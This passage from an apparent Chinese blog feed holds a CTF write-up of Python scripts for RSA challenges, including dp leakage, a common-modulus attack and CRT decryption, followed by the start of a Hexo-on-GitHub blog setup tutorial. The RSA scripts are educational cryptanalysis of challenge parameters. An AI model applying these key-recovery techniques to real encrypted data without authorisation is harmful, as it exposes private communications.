(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line"> </span><br><span class="line">key=rsa.PrivateKey(n,e,<span class="built_in">int</span>(d),p,q)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f=f.read()</span><br><span class="line">    print(rsa.decrypt(f,key))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201011163224705.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-5-已知p、q、dp、dq、c求明文m"><a href="#4-5-已知p、q、dp、dq、c求明文m" class="headerlink" title="4.5 已知p、q、dp、dq、c求明文m"></a>4.5 已知p、q、dp、dq、c求明文m</h3><p><strong>[BUUCTF]RSA1</strong></p><p>这道题属于已知p、q、dp、dq、c求明文类型<br><img src="https://img-blog.csdnimg.cn/20201005193829462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/MikeCoke/article/details/105959599">上脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(m))                  <span class="comment">#转为十六进制</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20201005194550372.png#pic_center" alt="在这里插入图片描述"><br>然后将16进制转换成字符串</p><p><img src="https://img-blog.csdnimg.cn/20201005194804576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-6已知n、e、dp、c，求m"><a href="#4-6已知n、e、dp、c，求m" class="headerlink" title="4.6已知n、e、dp、c，求m"></a>4.6已知n、e、dp、c，求m</h3><p><strong>[BUUCTF]RSA2</strong></p><p>下载附件，题目给出公钥n,e以及dp<br><img src="https://img-blog.csdnimg.cn/20201011163855598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp=d%(p-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">import</span>  rsa</span><br><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">dp=<span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">n=<span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">temp=dp*e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e) :</span><br><span class="line">    <span class="keyword">if</span> (temp-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">        x=(temp-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">        y=n%x</span><br><span class="line">        <span class="keyword">if</span> y==<span class="number">0</span>:</span><br><span class="line">            p=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">q=n//p</span><br><span class="line"><span class="comment">#&#x27;//&#x27;代表向下取整,&#x27;/&#x27;得到的是浮点数</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">key=rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#unhexlify()的作用是返回16进制数对应的字符串</span></span><br></pre></td></tr></table></figure><p>运行结果<br><img src="https://img-blog.csdnimg.cn/20201011164021212.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-7共模攻击"><a href="#4-7共模攻击" class="headerlink" title="4.7共模攻击"></a>4.7共模攻击</h3><p><strong>[BUUCTF]RSA3</strong><br>出现两个加密使用相同的模，可以在不知道私钥的情况下得到明文，这就是RSA中的<strong>共模攻击</strong>。<br><img src="https://img-blog.csdnimg.cn/20201011164858631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">  c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">  c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">  e1 = <span class="number">11187289</span></span><br><span class="line">  e2 = <span class="number">9647291</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line">  print(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本，得到明文m<br><img src="https://img-blog.csdnimg.cn/20201011164737363.png#pic_center" alt="在这里插入图片描述"><br>转16进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span>c61677b34396439313037376131616263623134663161396435343663383062653965667d</span><br></pre></td></tr></table></figure><p>十六进制转字符串<br><img src="https://img-blog.csdnimg.cn/20201109201954658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m"><a href="#4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m" class="headerlink" title="4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m"></a>4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m</h3><p><strong>[GUET-CTF2019]BabyRSA</strong><br><img src="https://img-blog.csdnimg.cn/20210201110739494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>已知<code>p+q</code>、<code>（p+1)(q+1</code>)、<code>e</code>、<code>d</code>,以及密文<code>c</code>.</p><p>利用 RSA的解密公式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M=C^d  mod n</span><br><span class="line">n = p*q</span><br></pre></td></tr></table></figure><p>所以推算出求n的公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = (p+<span class="number">1</span>)*(q+<span class="number">1</span>) - (p+q) - <span class="number">1</span></span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">b = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">c= <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = b-a-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(m))  <span class="comment">#（n2s将数值转化为字符串）</span></span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20210201111109395.png" alt="在这里插入图片描述"></p><hr><p>看到一份来自漏斗社区的<a href="https://www.freebuf.com/column/148898.html">RSA解题思路思维导图</a>，收藏起来8。</p><p><img src="https://img-blog.csdnimg.cn/20201004175237397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：做题遇到的一些RSA脚本&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="https://swhat.github.io/categories/CTF/CRYPTO/"/>
    
    
    <category term="RSA" scheme="https://swhat.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>个人博客搭建历程</title>
    <link href="https://swhat.github.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/"/>
    <id>https://swhat.github.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/</id>
    <published>2020-02-04T06:59:23.000Z</published>
    <updated>2021-03-31T09:56:19.397Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：使用Hexo+github搭建博客</p> <a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>1、hexo<br>2、Node.js<br>3、Git<br>4、GitHub</p><h2 id="注册Github和配置"><a href="#注册Github和配置" class="headerlink" title="注册Github和配置"></a>注册Github和配置</h2><p>官网：<a href="https://github.com/">https://github.com/</a></p><p><strong>1.注册账号</strong><br><img src="https://img-blog.csdnimg.cn/20210131213504600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.新建仓库</strong><br>新建一个储存仓库，username为github用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username.github.io</span><br></pre></td></tr></table></figure><p>在主页右上角，点击加号，找到<code>New repository</code>，点进去会显示如下界面，输入仓库名，点击创建</p><p>Repository name格式推荐写成<code>username.github.io</code>,点击Create repository<br><img src="https://img-blog.csdnimg.cn/20210131214016120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载地址：<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>一路next，打开cmd命令行，成功页面如下<br><img src="https://img-blog.csdnimg.cn/20210131140623911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开Git-Bash工具 ，初始化Git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.配置用户名</span><br><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line"><span class="comment">#用户名可以不是Github用户名，为了方便，设置一致。</span></span><br><span class="line">2.配置邮箱</span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱地址&quot;</span></span><br><span class="line">3.查看已配置的用户信息</span><br><span class="line">git config --global list</span><br></pre></td></tr></table></figure><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>下载地址：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br><img src="https://img-blog.csdnimg.cn/20210131140950940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开cmd，进入文件目录，安装成功如下<br><img src="https://img-blog.csdnimg.cn/20210131141134259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了加快速度，npm换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\nodejs&gt;npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">C:\Program Files\nodejs&gt;npm config get registry</span><br><span class="line">https://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>本地安装hexo前，应该先创建一个新文件夹blog</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> f:/hexo</span><br><span class="line"></span><br><span class="line">$ npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">$ hexo init blog</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line"></span><br><span class="line">$ npm install</span><br><span class="line"></span><br><span class="line">$ hexo g <span class="comment"># 或者hexo generate</span></span><br><span class="line"></span><br><span class="line">$ hexo s <span class="comment"># 或者hexo server，可以在http://localhost:4000/ 查看</span></span><br></pre></td></tr></table></figure><p>hexo命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hexo generate (hexo g) 生成静态文件，会在当前目录下生成一个新的叫做public的文件夹</span><br><span class="line"></span><br><span class="line">hexo server (hexo s) 启动本地web服务，用于博客的预览</span><br><span class="line"></span><br><span class="line">hexo deploy (hexo d) 部署播客到远端（比如github, heroku等平台）</span><br><span class="line"></span><br><span class="line"><span class="variable">$hexo</span> new <span class="string">&quot;postName&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">$ hexo new page <span class="string">&quot;pageName&quot;</span> <span class="comment">#新建页面</span></span><br><span class="line">$ hexo d -g <span class="comment">#生成部署</span></span><br><span class="line">$ hexo s -g <span class="comment">#生成预览</span></span><br></pre></td></tr></table></figure><p>本地hexo配置情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt;hexo -v</span><br><span class="line">hexo-cli: 4.2.0</span><br><span class="line">os: Windows_NT 10.0.19041 win32 x64</span><br><span class="line">node: 14.15.4</span><br><span class="line">v8: 8.4.371.19-node.17</span><br><span class="line">uv: 1.40.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.9</span><br><span class="line">ares: 1.16.1</span><br><span class="line">modules: 83</span><br><span class="line">nghttp2: 1.41.0</span><br><span class="line">napi: 7</span><br><span class="line">llhttp: 2.1.3</span><br><span class="line">openssl: 1.1.1i</span><br><span class="line">cldr: 37.0</span><br><span class="line">icu: 67.1</span><br><span class="line">tz: 2020a</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></figure><h1 id="Hexo主题设置"><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a>Hexo主题设置</h1><p>官方主题推荐：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><h2 id="主题1：stun"><a href="#主题1：stun" class="headerlink" title="主题1：stun"></a>主题1：stun</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://theme-stun.github.io/docs/zh-CN/guide/quick-start.html#%E4%BD%BF%E7%94%A8">帮助文档</a><br>在Hexo 根目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean  </span><br><span class="line"><span class="comment">#该命令的作用是清除缓存，若不输入此命令，服务器有可能更新不了主题</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/liuyib/hexo-theme-stun.git themes/stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装依赖hexo-renderer-pug</span></span><br><span class="line">$ npm install --save hexo-renderer-pug</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>修改Hexo目录下的<code>_config.yml</code>配置文件中的theme属性，将默认的<code>landscape改</code>为为<code>black-blue</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: stun</span><br></pre></td></tr></table></figure><p>然后，启动 Hexo 服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/stun</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure><h3 id="本地效果"><a href="#本地效果" class="headerlink" title="本地效果"></a>本地效果</h3><p>访问：<a href="http://localhost:4000/">http://localhost:4000/</a><br><img src="https://img-blog.csdnimg.cn/20210131211931994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h3><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save hexo-render-pug</span><br><span class="line">$ npm install --save hexo-generator-search</span><br><span class="line">$ npm install --save hexo-deployer-git  </span><br></pre></td></tr></table></figure><p>1.增加页面导航</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> page categories</span><br><span class="line">$ hexo <span class="keyword">new</span> page tags</span><br></pre></td></tr></table></figure><p>在项目目录<code>/source/categories/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>: categories</span><br></pre></td></tr></table></figure><p>在项目目录<code>/source/tags/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>: tags</span><br></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#展示设置</span></span><br><span class="line">title: &#123;$自定义文字&#125;</span><br><span class="line">language: zh-CN </span><br><span class="line">url: &#123;$博客地址&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#主题</span></span><br><span class="line">theme: stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#git相关</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: </span><br><span class="line">  github: &#123;$你的博客仓库&#125;</span><br><span class="line">  gitee: &#123;$你的博客仓库&#125;</span><br><span class="line">  branch: master</span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索相关</span></span><br><span class="line">search:</span><br><span class="line">  path: search.json</span><br><span class="line">  field: post</span><br><span class="line">  content: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>2.修改部署文件夹下/themes/stun/_config.yml(挑选重要部分修改)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 